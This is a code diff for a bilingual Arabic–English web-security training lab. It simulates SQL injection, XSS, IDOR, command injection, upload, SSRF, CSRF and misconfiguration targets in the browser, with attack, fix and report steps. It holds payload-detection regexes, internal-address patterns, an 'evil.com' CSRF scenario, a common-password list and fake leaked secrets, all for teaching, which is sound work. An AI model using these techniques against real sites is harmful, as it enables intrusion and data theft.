+      <label>الخطورة · Severity</label><select id="r_sev"><option>حرجة · Critical</option><option>عالية · High</option><option>متوسطة · Medium</option><option>منخفضة · Low</option></select>
+      <label>خطوات إعادة الإنتاج · Steps to reproduce</label><textarea id="r_steps" placeholder="١. افتح الصفحة…  ٢. أدخل الحمولة…  ٣. لاحظ…"></textarea>
+      <label>الأثر · Impact</label><textarea id="r_imp" placeholder="ماذا يستطيع المهاجم أن يفعل؟"></textarea>
+      <label>الإصلاح الموصى به · Recommended fix</label><textarea id="r_fix" placeholder="كيف يُغلَق الجذر؟"></textarea>
+    </div>
+    <div class="rowbtns"><button class="btn g" onclick="submitReport('${c.id}')">تسليم التقرير وإنهاء التحدّي</button></div>`;
+  }
+}
+function esc(s){return s.replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
+
+/* ============ DEFEND logic ============ */
+function pickFix(id,i){ if(prog(id).defended) return; state[id]=Object.assign({},state[id],{defendSel:i}); save(); renderChallenge(); }
+function applyFix(id){
+  const c=CH.find(x=>x.id===id); const sel=prog(id).defendSel;
+  const correct=c.fixes[sel].correct;
+  state[id]=Object.assign({},state[id],{defendPick:sel});
+  if(correct){ state[id].defended=true; state[id].patched=true; save(); toast('✅ الإصلاح صحيح! أعدنا الهجوم وفشل.'); }
+  else { save(); toast('❌ هذا يعالج العَرَض لا الجذر. جرّب مرة أخرى.',true);
+    setTimeout(()=>{ state[id]=Object.assign({},state[id],{defendPick:null,defendSel:null}); save(); renderChallenge(); },1600); }
+  renderChallenge();
+}
+function submitReport(id){
+  const t=(document.getElementById('r_title').value||'').trim();
+  const s=(document.getElementById('r_steps').value||'').trim();
+  if(t.length<8||s.length<8){ toast('✍️ اكتب عنواناً وخطوات أوضح قبل التسليم.',true); return; }
+  setStep(id,'reported'); toast('🏆 تحدٍّ مكتمل! حصلت على XP.'); renderXP(); renderSide(); renderChallenge();
+}
+function nextChallenge(id){
+  const i=CH.findIndex(x=>x.id===id); const n=CH[(i+1)%CH.length]; open_(n.id);
+}
+
+/* ============ SIMULATED TARGETS ============ */
+function mountTarget(c,station){
+  const host=document.getElementById('tgt'); if(!host) return;
+  const patched = !!prog(c.id).patched;  // after a correct defend, targets are hardened
+  if(c.target==='sqli') host.innerHTML=simSQLi(patched);
+  if(c.target==='xss') host.innerHTML=simXSS(patched);
+  if(c.target==='idor') host.innerHTML=simIDOR(patched);
+  if(c.target==='cmdi') host.innerHTML=simCMDI(patched);
+  if(c.target==='upload') host.innerHTML=simUpload(patched);
+  if(c.target==='auth') host.innerHTML=simAuth(patched);
+  if(c.target==='ssrf') host.innerHTML=simSSRF(patched);
+  if(c.target==='csrf') host.innerHTML=simCSRF(patched);
+  if(c.target==='misconfig') host.innerHTML=simMisconfig(patched);
+  if(c.target==='dataexp') host.innerHTML=simDataexp(patched);
+  // each action-button press counts as an attempt (gates the help button)
+  host.querySelectorAll('button').forEach(btn=>btn.addEventListener('click',bumpTry));
+}
+function shell(url,inner){
+  return `<div class="sim"><div class="urlbar"><div class="dots"><i></i><i></i><i></i></div>
+    <div class="addr">${url}</div></div><div class="body">${inner}</div></div>`;
+}
+function siteHdr(name,color){return `<div class="sitehdr"><div class="lg" style="background:${color||'#2d6cdf'}">أ</div><b>${name}</b></div>`;}
+
+/* ---- SQLi ---- */
+function simSQLi(patched){
+  return shell("https://bank.osos.lab/staff/login",
+    siteHdr("OSOS Bank — Staff Portal")+
+    `<label>Username</label><input type="text" id="sq_u" placeholder="username">
+     <label>Password</label><input type="password" id="sq_p" placeholder="password">
+     <button class="go" onclick="doSQLi(${patched})">Sign in</button>
+     <div id="sq_r"></div>
+     <p style="font-size:11px;color:#8a95a0;margin-top:14px">Hint for defenders: the real admin password is a long random string — guessing won't work.</p>`);
+}
+function doSQLi(patched){
+  const u=val('sq_u'),p=val('sq_p'); const r=document.getElementById('sq_r');
+  const inj=/'\s*or\s*'?1'?\s*=\s*'?1|'\s*or\s*1=1|--|'\s*#/i.test(u);
+  if(patched){
+    if(inj){ r.innerHTML=res('err',"Login failed: invalid credentials.  (input treated as literal data)"); }
+    else r.innerHTML=res('err',"Login failed: invalid credentials.");
+    return;
+  }
+  if(inj){ r.innerHTML=res('flag',"✅ Logged in as: admin (user #1)  — authentication bypassed!\nFLAG{sqli_login_bypass}"); markExploit('sqli'); }
+  else r.innerHTML=res('err',"Login failed: invalid credentials.");
+}
+
+/* ---- XSS ---- */
+function simXSS(patched){
+  const comments = (window._xssC||["Nice site! — Sara","أول تعليق 👋 — Omar"]);
+  const list = comments.map(c=> patched? `<div style="padding:7px 0;border-bottom:1px solid #eee">${esc(c)}</div>`
+                                        : `<div style="padding:7px 0;border-bottom:1px solid #eee">${c}</div>`).join('');
+  return shell("https://community.osos.lab/guestbook",
+    siteHdr("OSOS Community — Guestbook","#7a3df0")+
+    `<label>اترك تعليقاً · Leave a comment</label>
+     <input type="text" id="xs_c" placeholder="your comment">
+     <button class="go" style="background:#7a3df0" onclick="doXSS(${patched})">Post</button>
+     <div style="margin-top:16px;font-weight:600;color:#444">Comments</div>
+     <div id="xs_list">${list}</div>`);
+}
+function doXSS(patched){
+  const c=val('xs_c'); if(!c) return;
+  window._xssC = (window._xssC||["Nice site! — Sara","أول تعليق 👋 — Omar"]).concat([c]);
+  const hasPayload=/<script|onerror=|onload=|<img|<svg/i.test(c);
+  // re-render list
+  document.getElementById('tgt').innerHTML=simXSS(patched);
+  if(!patched && hasPayload){
+    // simulate execution
+    const list=document.getElementById('xs_list');
+    list.classList.add('xssfire');
+    const fire=document.createElement('div');
+    fire.innerHTML=res('flag',"⚠️ XSS FIRED — alert('document.cookie') executed in every viewer's browser!\nFLAG{stored_xss}");
+    list.parentElement.appendChild(fire);
+    markExploit('xss');
+  }
+}
+
+/* ---- IDOR ---- */
+const INV={1050:["Mona Ali","SAR 3,400","Private"],1051:["Faisal R.","SAR 980","Private"],1052:["YOU (test user)","SAR 1,250","Yours"],1053:["Admin Dept","SAR 42,000","Private"]};
+function simIDOR(patched){
+  return shell(`https://store.osos.lab/invoice?id=<span id="id_cur" style="color:#c0392b">1052</span>`,
+    siteHdr("OSOS Store — Invoice Viewer","#1f9d6b")+
+    `<label>Invoice id (change the number and reload)</label>
+     <input type="text" id="id_in" value="1052" style="direction:ltr">
+     <button class="go" style="background:#1f9d6b" onclick="doIDOR(${patched})">Load invoice</button>
+     <div id="id_r"></div>`);
+}
+function doIDOR(patched){
+  const id=val('id_in'); const r=document.getElementById('id_r'); const cu=document.getElementById('id_cur');
+  if(cu) cu.textContent=id;
+  const rec=INV[id];
+  if(!rec){ r.innerHTML=res('err',"Invoice not found."); return; }
+  if(patched && id!=="1052"){ r.innerHTML=res('err',"404 — Not found. (ownership check: this invoice is not yours)"); return; }
+  const owned = id==="1052";
+  const table=`<table><tr><th>Field</th><th>Value</th></tr>
+    <tr><td>Invoice</td><td>#${id}</td></tr><tr><td>Customer</td><td>${rec[0]}</td></tr>
+    <tr><td>Amount</td><td>${rec[1]}</td></tr></table>`;
+  if(owned){ r.innerHTML=res('ok',"Your invoice:")+table; }
+  else { r.innerHTML=res('flag',"⚠️ You accessed another customer's private invoice!\nFLAG{idor_invoice}")+table; markExploit('idor'); }
+}
+
+/* ---- Command Injection ---- */
+function simCMDI(patched){
+  return shell("https://net.osos.lab/tools/ping",
+    siteHdr("OSOS NetTools — Ping","#0b6b6b")+
+    `<label>Host to ping</label><input type="text" id="cm_h" placeholder="8.8.8.8" style="direction:ltr">
+     <button class="go" style="background:#0b6b6b" onclick="doCMDI(${patched})">Ping</button>
+     <div id="cm_r"></div>`);
+}
+function doCMDI(patched){
+  const h=val('cm_h'); const r=document.getElementById('cm_r');
+  const sep=/[;|&]|&&|\$\(|`/.test(h);
+  const base=`PING ${h.split(/[;|&]/)[0]||'host'} : 64 bytes, time=12.4 ms`;
+  if(patched){
+    if(sep || !/^[\w.\-]+$/.test(h)){ r.innerHTML=res('err',"Rejected: invalid host format."); }
+    else r.innerHTML=res('ok',base);
+    return;
+  }
+  if(sep){ r.innerHTML=res('flag',base+"\n$ "+h.replace(/^[^;|&]*[;|&]+/,'').trim()+"\nroot\nuid=0(root) gid=0(root)\n⚠️ Your command executed on the server!\nFLAG{command_injection}"); markExploit('cmdi'); }
+  else r.innerHTML=res('ok',base);
+}
+
+/* ---- File Upload ---- */
+function simUpload(patched){
+  return shell("https://profile.osos.lab/avatar",
+    siteHdr("OSOS Profile — Avatar Upload","#b5532a")+
+    `<label>اسم الملف · File name</label><input type="text" id="up_f" placeholder="me.jpg" style="direction:ltr">
+     <button class="go" style="background:#b5532a" onclick="doUpload(${patched})">Upload</button>
+     <div id="up_r"></div>`);
+}
+function doUpload(patched){
+  const f=val('up_f'); const r=document.getElementById('up_r');
+  const isImg=/\.(jpg|jpeg|png|gif|webp)$/i.test(f);
+  const isCode=/\.(php|phtml|jsp|asp|aspx|py|sh|cgi)$/i.test(f);
+  if(patched){
+    if(isImg) r.innerHTML=res('ok',"Uploaded: avatar stored safely (validated as image, served as download).");
+    else r.innerHTML=res('err',"Rejected: file content is not a valid image.");
+    return;
+  }
+  if(isCode){ r.innerHTML=res('flag',`Uploaded to /uploads/${f}\nVisiting https://profile.osos.lab/uploads/${f} ...\n> server-side code EXECUTED\n⚠️ Web shell active — server compromised!\nFLAG{file_upload_rce}`); markExploit('upload'); }
+  else if(isImg) r.innerHTML=res('ok',"Uploaded: avatar set.");
+  else r.innerHTML=res('err',"Unknown file type uploaded (stored).");
+}
+
+/* ---- Broken Auth ---- */
+const COMMON=["123456","password","admin","12345678","qwerty","111111","abc123"];
+function simAuth(patched){
+  const tries=window._authTries||0;
+  return shell("https://admin.osos.lab/login",
+    siteHdr("OSOS Admin","#c0392b")+
+    `<label>Username</label><input type="text" id="au_u" value="admin" style="direction:ltr">
+     <label>Password</label><input type="password" id="au_p" placeholder="password" style="direction:ltr">
+     <button class="go" style="background:#c0392b" onclick="doAuth(${patched})">Login</button>
+     <div style="font-size:11px;color:#8a95a0;margin-top:8px">Failed attempts: <b id="au_t">${tries}</b>${patched?' / 5 (locked after 5)':' (no limit)'}</div>
+     <div id="au_r"></div>`);
+}
+function doAuth(patched){
+  const u=val('au_u'),p=val('au_p'); const r=document.getElementById('au_r');
+  window._authTries=(window._authTries||0)+1;
+  const t=document.getElementById('au_t'); if(t)t.textContent=window._authTries;
+  if(patched && window._authTries>5){ r.innerHTML=res('err',"🔒 Account locked after 5 failed attempts. Try again in 15 minutes."); return; }
+  if(patched){
+    // strong password now — common ones never match
+    r.innerHTML=res('err',"Login failed."); return;
+  }
+  if(u==="admin" && COMMON.includes(p)){ r.innerHTML=res('flag',`✅ Logged in as admin with weak password "${p}"!\nFLAG{weak_auth}`); markExploit('auth'); }
+  else r.innerHTML=res('err',"Login failed.");
+}
+
+/* ---- SSRF ---- */
+function simSSRF(patched){
+  return shell("https://reader.osos.lab/preview",
+    siteHdr("OSOS Reader — Link Preview","#415a77")+
+    `<label>URL to preview</label><input type="text" id="ss_u" placeholder="https://example.com" style="direction:ltr">
+     <button class="go" style="background:#415a77" onclick="doSSRF(${patched})">Fetch preview</button>
+     <div id="ss_r"></div>`);
+}
+function doSSRF(patched){
+  const u=val('ss_u'); const r=document.getElementById('ss_r');
+  const internal=/localhost|127\.0\.0\.1|169\.254\.|10\.|192\.168\.|internal|metadata|::1/i.test(u);
+  if(!/^https?:\/\//i.test(u)){ r.innerHTML=res('err',"Invalid URL."); return; }
+  if(patched){
+    if(internal){ r.innerHTML=res('err',"Blocked: destination is not on the allowlist (internal address refused)."); }
+    else r.innerHTML=res('ok',"Preview: <title>Example Domain</title> — 200 OK");
+    return;
+  }
+  if(internal){ r.innerHTML=res('flag',"Fetched "+u+"\n--- internal response ---\n{ \"role\":\"admin\",\"token\":\"int-9f3a...\",\"db\":\"10.0.0.5\" }\n⚠️ Server reached an internal-only service!\nFLAG{ssrf_internal}"); markExploit('ssrf'); }
+  else r.innerHTML=res('ok',"Preview: <title>Example Domain</title> — 200 OK");
+}
+
+/* ---- CSRF ---- */
+function simCSRF(patched){
+  const cur=window._csrfEmail||"you@osos.lab";
+  return `<div class="sim"><div class="urlbar"><div class="dots"><i></i><i></i><i></i></div>
+      <div class="addr">https://account.osos.lab/settings</div></div>
+      <div class="body">${siteHdr("OSOS Account — Settings","#2d6cdf")}
+      <p style="font-size:13px">Your account email: <b id="cs_email">${cur}</b></p>
+      <p style="font-size:12px;color:#8a95a0;margin-top:6px">You are logged in. The change-email form below is the real app.</p></div></div>
+    <div class="bl" style="margin-top:12px"><h4>🎭 صفحة المهاجم · Attacker's page (evil.com)</h4>
+      <p style="font-size:13px">هذه صفحة تتحكّم بها على موقع آخر. تحتوي نموذجاً يُرسل تلقائياً لنقطة تغيير البريد في «حساب أسس». حين يزورها الضحية (وهو مسجّل الدخول)، ماذا يحدث؟</p>
+      <div class="en" style="margin-top:6px">A page you control. It auto-submits a forged email-change request. When a logged-in victim visits it...</div>
+      <label style="display:block;font-size:13px;color:var(--mut);margin:12px 0 5px">البريد الذي يريد المهاجم ضبطه · Email the attacker sets</label>
+      <input type="text" id="cs_new" value="attacker@evil.com" style="width:100%;background:var(--panel2);border:1px solid var(--line);border-radius:9px;padding:10px 12px;color:var(--txt);direction:ltr">
+      <div class="rowbtns"><button class="btn" onclick="doCSRF(${patched})">🎯 الضحية يزور صفحة المهاجم</button></div>
+      <div id="cs_r"></div></div>`;
+}
+function doCSRF(patched){
+  const nw=val('cs_new')||"attacker@evil.com"; const r=document.getElementById('cs_r');
+  if(patched){
+    r.innerHTML=res('err',"Victim visited the page, but the forged request was REJECTED: missing/invalid CSRF token, and SameSite cookie not sent cross-site. Email unchanged.");
+    return;
+  }
+  window._csrfEmail=nw; const em=document.getElementById('cs_email'); if(em)em.textContent=nw;
+  r.innerHTML=res('flag',"The forged form auto-submitted using the victim's session cookie.\nVictim's email silently changed to: "+nw+"\n⚠️ Account takeover (attacker can now reset the password)!\nFLAG{csrf_email_change}");
+  markExploit('csrf');
+}
+
+/* ---- Security Misconfiguration ---- */
+function simMisconfig(patched){
+  return shell("https://dev.osos.lab/<span id='mc_path' style='color:#c0392b'>/</span>",
+    siteHdr("OSOS Dev Server","#555")+
+    `<label>اطلب مساراً · Request a path</label>
+     <input type="text" id="mc_in" placeholder="/.git/config" style="direction:ltr">
+     <button class="go" style="background:#555" onclick="doMisconfig(${patched})">Go</button>
+     <div id="mc_r"></div>
+     <p style="font-size:11px;color:#8a95a0;margin-top:12px">Try: /.git/config · /.env · /backup.zip · /admin</p>`);
+}
+function doMisconfig(patched){
+  const path=(val('mc_in')||'').trim().toLowerCase(); const r=document.getElementById('mc_r'); const pc=document.getElementById('mc_path'); if(pc)pc.textContent=path||'/';
+  const SENS={
+    '/.git/config':"[core] repositoryformatversion=0\n[remote \"origin\"]\n  url=https://github.com/osos/portal.git\n# full source history is downloadable!",
+    '/.env':"DB_PASSWORD=Sup3rS3cret!\nAPI_KEY=sk_live_9f3a2b...\nJWT_SECRET=osos_prod_secret",
+    '/backup.zip':"backup.zip (42 MB) — full database + source code",
+    '/admin':"Admin panel (debug mode ON) — stack trace reveals: /var/www, DB host 10.0.0.5, framework v2.1"
+  };
+  const hit=Object.keys(SENS).find(k=>path===k||path==='/'+k.replace(/^\//,''));
+  if(patched){
+    if(hit){ r.innerHTML=res('err',"403 Forbidden — access denied (hardened)."); }
+    else r.innerHTML=res('err',"404 Not Found.");
+    return;
+  }
+  if(hit){ r.innerHTML=res('flag',SENS[hit]+"\n⚠️ Sensitive file exposed by misconfiguration!\nFLAG{misconfiguration}"); markExploit('misconfig'); }
+  else r.innerHTML=res('err',"404 Not Found.");
+}
+
+/* ---- Sensitive Data Exposure ---- */
+function simDataexp(patched){
+  return shell("https://api.osos.lab/v1/users",
+    siteHdr("OSOS API — /v1/users","#1a1a2e")+
+    `<button class="go" style="background:#1a1a2e" onclick="doDataexp(${patched})">GET /v1/users</button>
+     <div id="de_r"></div>`);
+}
+function doDataexp(patched){
+  const r=document.getElementById('de_r');
+  if(patched){
+    r.innerHTML=res('ok','[\n  { "id":1, "name":"Mona", "email":"m***@osos.lab" },\n  { "id":2, "name":"Faisal", "email":"f***@osos.lab" }\n]\n(passwords hashed server-side, never returned; sent over HTTPS)');
+    return;
+  }
+  r.innerHTML=res('flag','[\n  { "id":1, "name":"Mona",   "password":"mona2024",     "token":"tok_a91f..." },\n  { "id":2, "name":"Faisal", "password":"P@ssw0rd!",    "token":"tok_7c3e..." },\n  { "id":3, "name":"Admin",  "password":"admin#osos22", "token":"tok_root..." }\n]\n⚠️ Passwords & tokens returned in PLAIN TEXT!\nFLAG{sensitive_data_exposure}');
+  markExploit('dataexp');
+}
+
+/* ---- helpers ---- */
+function val(id){const e=document.getElementById(id);return e?e.value:'';}
+function res(cls,txt){return `<div class="result ${cls}">${esc(txt).replace(/\n/g,'<br>')}</div>`;}
+function markExploit(id){
+  if(prog(id).exploited) return;
+  setStep(id,'exploited'); renderSide(); renderXP();
+  toast('🎯 أحسنت! أثبتّ الثغرة. انتقل لمحطّة «دافع».');
+}
+
+/* ============ HELP DRAWER ============ */
+function helpTier(id){ return prog(id).helpTier||0; }
+function openHelp(){
+  if(!helpUnlocked(cur)) return;
+  renderHelp();
+  document.getElementById('drawer').classList.add('open');
+  document.getElementById('ov').classList.add('on');
+}
+function revealTier(){
+  const t=helpTier(cur);
+  if(t>=3) return;
+  state[cur]=Object.assign({},state[cur],{helpTier:t+1}); save();
+  toast('💡 فُتح مستوى مساعدة — خُصم ١٠٪ من نقاط هذا التحدّي.');
+  renderHelp(); renderXP();
+}
+function renderHelp(){
+  const c=CH.find(x=>x.id===cur); if(!c) return; const h=c.help; const t=helpTier(c.id);
+  const tiers=[
+    {cls:'',  ic:'💡', ar:'المستوى ١ · نصيحة', en:'Tier 1 · Nudge', body:c.hint_ar, body_en:c.hint_en},
+    {cls:'v', ic:'🟣', ar:'المستوى ٢ · أين المشكلة', en:'Tier 2 · What & where', body:h.p_ar+' '+h.v_ar, body_en:h.p_en+' '+h.v_en},
+    {cls:'s', ic:'🟢', ar:'المستوى ٣ · الحل الكامل', en:'Tier 3 · Full solution', body:h.s_ar, body_en:h.s_en},
+  ];
+  let html='';
+  for(let i=0;i<3;i++){
+    if(i<t){ const x=tiers[i];
+      html+=`<div class="hsec ${x.cls}"><h5>${x.ic} ${x.ar}</h5><p>${x.body}</p><div class="en">${x.body_en}</div></div>`;
+    }
+  }
+  const pen=Math.min(30,10*t);
+  if(t<3){
+    html+=`<div style="text-align:center;margin:14px 0">
+      <button class="btn" onclick="revealTier()">افتح ${t===0?'أول':'المستوى '+(t+1)} مستوى مساعدة ↓</button>
+      <div style="font-size:11px;color:var(--mut);margin-top:8px">كل مستوى يخصم ١٠٪ من نقاط التحدّي · الخصم الحالي: ${pen}٪</div></div>`;
+  } else {
+    html+=`<div style="font-size:12px;color:var(--mut);text-align:center;margin-top:12px">كشفت كل المستويات (خصم ${pen}٪). المرجع الكامل في كتاب المتدرب العملي.</div>`;
+  }
+  document.getElementById('helpBody').innerHTML=html;
+}
+function closeHelp(){ document.getElementById('drawer').classList.remove('open'); document.getElementById('ov').classList.remove('on'); }
+
+/* ============ TOAST ============ */
+let toastT;
+function toast(msg,bad){
+  const t=document.getElementById('toast'); t.textContent=msg; t.className='toast show'+(bad?' bad':'');
+  clearTimeout(toastT); toastT=setTimeout(()=>t.className='toast'+(bad?' bad':''),2600);
+}
+
+/* ============ MOBILE NAV ============ */
+function renderMobileNav(){
+  const m=document.getElementById('mnav'); if(!m) return;
+  m.innerHTML='<div class="mchip" onclick="goHome()">🏠</div>'+CH.map(c=>{
+    const locked=!levelUnlocked(c.lvl); const done=chalDone(c.id);
+    return `<div class="mchip ${cur===c.id?'active':''} ${locked?'locked':''}" onclick="open_('${c.id}')">${locked?'🔒':(done?'✅':c.icon)} ${c.ar}</div>`;
+  }).join('');
+}
+
+/* ============ CERTIFICATE ============ */
+function showCert(){
+  if(!allComplete()){ toast('أكمل كل التحدّيات أولاً.',true); return; }
+  closeHelp(); document.getElementById('helpbtn').style.display='none';
+  const nm=(ME&&ME.name)?ME.name:(localStorage.getItem('labCertName')||'');
+  const d=new Date();
+  const dateStr=d.getDate()+' / '+(d.getMonth()+1)+' / '+d.getFullYear();
+  const vulns=CH.map(c=>`<span style="display:inline-block;background:#122;border:1px solid #1e3a3a;color:#bfe;border-radius:20px;padding:3px 11px;margin:3px;font-size:12px">${c.icon} ${c.ar}</span>`).join('');
+  document.getElementById('main').innerHTML=`
+    <div style="max-width:760px;margin:0 auto">
+    ${nm?'':`<div class="bl" style="border-color:var(--gold)"><h4 style="color:var(--gold)">✍️ اسمك على الشهادة</h4>
+      <input id="certName" placeholder="اكتب اسمك الكامل" style="width:100%;background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:10px 12px;color:var(--txt);font-size:15px;margin-top:8px">
+      <div class="rowbtns"><button class="btn" onclick="saveCertName()">اعتمد الاسم</button></div></div>`}
+    <div id="certCard" style="background:linear-gradient(135deg,#0d1a24,#0a1118);border:2px solid var(--gold);border-radius:18px;padding:40px 36px;text-align:center;position:relative;overflow:hidden">
+      <div style="position:absolute;inset:0;background:radial-gradient(600px 200px at 50% -20%,rgba(242,193,78,.12),transparent)"></div>
+      <div style="position:relative">
+        <div style="font-size:13px;letter-spacing:3px;color:var(--gold);margin-bottom:6px">معهد أسس التقنية والقانون العالي للتدريب</div>
+        <div style="font-size:11px;color:var(--mut);letter-spacing:1px;margin-bottom:22px">OSOS INSTITUTE · CYBER LAB</div>
+        <div style="width:58px;height:58px;margin:0 auto 14px;border-radius:14px;background:linear-gradient(135deg,var(--red),#b3303c);display:grid;place-items:center;font-size:28px;font-weight:700;box-shadow:0 0 22px rgba(255,77,94,.4)">أ</div>
+        <div style="font-size:20px;color:#c6d2df;margin-bottom:4px">شهادة إتمام مختبر الأمن السيبراني</div>
+        <div style="font-size:12px;color:var(--mut);margin-bottom:20px" class="en">Certificate of Completion — Cyber Security Lab</div>
+        <div style="font-size:13px;color:var(--mut)">تُمنح هذه الشهادة إلى</div>
+        <div style="font-size:30px;font-weight:700;color:var(--gold);margin:8px 0 4px">${nm||'—'}</div>
+        ${ME&&ME.num?`<div style="font-size:12px;color:var(--mut)">الرقم التدريبي: ${ME.num}</div>`:''}
+        <div style="font-size:14px;color:#c6d2df;max-width:520px;margin:18px auto;line-height:1.9">لإتمامه بنجاح جميع تحدّيات المختبر التفاعلي عبر المحطّات الأربع — الاكتشاف والهجوم والدفاع وكتابة التقرير — وإتقانه معالجة الثغرات التالية:</div>
+        <div style="margin:10px 0 18px">${vulns}</div>
+        <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-top:26px;border-top:1px solid #1e2a38;padding-top:16px">
+          <div style="text-align:center;font-size:12px;color:var(--mut)">التاريخ<br><b style="color:var(--txt)">${dateStr}</b></div>
+          <div style="text-align:center;font-size:12px;color:var(--mut)">المجموع<br><b style="color:var(--grn)">${totalXP()} XP · ${rankOf(totalXP())}</b></div>
+          <div style="text-align:center;font-size:12px;color:var(--mut)">التوقيع<br><b style="color:var(--txt)">إدارة المعسكر</b></div>
+        </div>
+      </div>
+    </div>
+    <div class="rowbtns" style="justify-content:center;margin-top:18px">
+      <button class="btn o" onclick="goHome()">← رجوع</button>
+      <button class="btn" style="background:var(--gold);color:#2a1e00" onclick="window.print()">🖨️ طباعة / حفظ PDF</button>
+    </div></div>`;
+  renderMobileNav();
+}
+function saveCertName(){ const v=(document.getElementById('certName').value||'').trim(); if(v.length<2){toast('اكتب اسمك.',true);return;} localStorage.setItem('labCertName',v); if(!ME)ME={}; ME.name=v; showCert(); }
+
+/* ============ STAFF DASHBOARD (?admin=1) ============ */
+async function renderAdmin(){
+  document.getElementById('helpbtn').style.display='none';
+  const m=document.getElementById('main');
+  m.innerHTML=`<div class="hero"><h1>لوحة المشرف · تقدّم المختبر</h1><div class="en">Instructor Dashboard — Lab Progress</div>
+    <p>متابعة إنجاز الطلاب في مختبر الأمن السيبراني، والتحكّم بزر المساعدة.</p></div>
+    <div class="bl"><h4>🆘 زر «تورطت؟ ساعدني»</h4>
+    <p>يظهر للطلاب داخل كل تحدٍّ ليشرح المشكلة والثغرة والحل. يمكنك إيقافه أثناء الاختبارات وتشغيله وقت التدريب.</p>
+    <div class="rowbtns">
+      <button class="btn g" onclick="toggleHelp(true)">✅ تشغيل الزر</button>
+      <button class="btn" onclick="toggleHelp(false)">🚫 إيقاف الزر</button>
+      <span id="helpState" style="align-self:center;color:var(--mut)">الحالة: ${helpEnabled?'مُفعّل':'موقوف'}</span>
+    </div></div>
+    <div id="roster"><div class="bl">جارِ تحميل بيانات الطلاب…</div></div>`;
+  const rows = window.LabCloud ? await window.LabCloud.all() : null;
+  const r=document.getElementById('roster');
+  if(rows===null){ r.innerHTML=`<div class="bl" style="border-color:var(--gold)"><p>تعذّر تحميل البيانات. افتح هذه الصفحة وأنت مسجّل دخول كمشرف/مدرب من نفس نطاق البوابة.</p><div class="en">Open this page while signed in as admin/trainer on the portal's domain.</div></div>`; return; }
+  if(!rows.length){ r.innerHTML=`<div class="bl"><p>لا يوجد طلاب بدؤوا المختبر بعد.</p></div>`; return; }
+  const head=CH.map(c=>`<th title="${c.ar}">${c.icon}</th>`).join('');
+  const body=rows.sort((a,b)=>(b.updated||0)-(a.updated||0)).map(st=>{
+    const pr=st.prog||{};
+    const cells=CH.map(c=>{ const p=pr[c.id]||{}; const done=p.exploited&&p.defended&&p.reported; const part=p.exploited||p.defended; return `<td style="text-align:center;color:${done?'var(--grn)':part?'var(--gold)':'#3a4a5a'}">${done?'✅':part?'🔸':'○'}</td>`; }).join('');
+    const nDone=CH.filter(c=>{const p=pr[c.id]||{};return p.exploited&&p.defended&&p.reported;}).length;
+    const pct=Math.round(nDone/CH.length*100);
+    return `<tr><td style="white-space:nowrap"><b>${st.name||'—'}</b><br><span style="font-size:11px;color:var(--mut)">#${st.num}</span></td>${cells}
+      <td style="text-align:center"><b style="color:${pct===100?'var(--grn)':'var(--txt)'}">${pct}%</b></td></tr>`;
+  }).join('');
+  r.innerHTML=`<div class="bl" style="padding:0;overflow:auto"><table style="width:100%;border-collapse:collapse;font-size:13px">
+    <tr style="background:var(--panel2)"><th style="text-align:right;padding:10px 12px">الطالب</th>${head}<th style="padding:10px">%</th></tr>
+    ${body}</table></div>
+    <p style="font-size:12px;color:var(--mut)">الرموز: ✅ مكتمل · 🔸 جارٍ · ○ لم يبدأ — الأعمدة بترتيب التحدّيات.</p>`;
+  // simple table styling
+  r.querySelectorAll('td,th').forEach(e=>{e.style.borderBottom='1px solid var(--line)';e.style.padding=e.style.padding||'9px 10px';});
+}
+async function toggleHelp(on){
+  const ok = window.LabCloud ? await window.LabCloud.setHelp(on) : false;
+  helpEnabled=on; const s=document.getElementById('helpState'); if(s)s.textContent='الحالة: '+(on?'مُفعّل':'موقوف');
+  toast(ok?('تم '+(on?'تشغيل':'إيقاف')+' زر المساعدة لكل الطلاب.'):'تعذّر الحفظ في القاعدة (طُبّق محلياً فقط).',!ok);
+}
+
+/* ============ INIT ============ */
+if(ADMINVIEW){ document.getElementById('main').innerHTML='<div class="bl">جارِ التحقّق من صلاحية المشرف…</div>'; }
+else { renderSide(); goHome(); }
+</script>
+</body>
+</html>
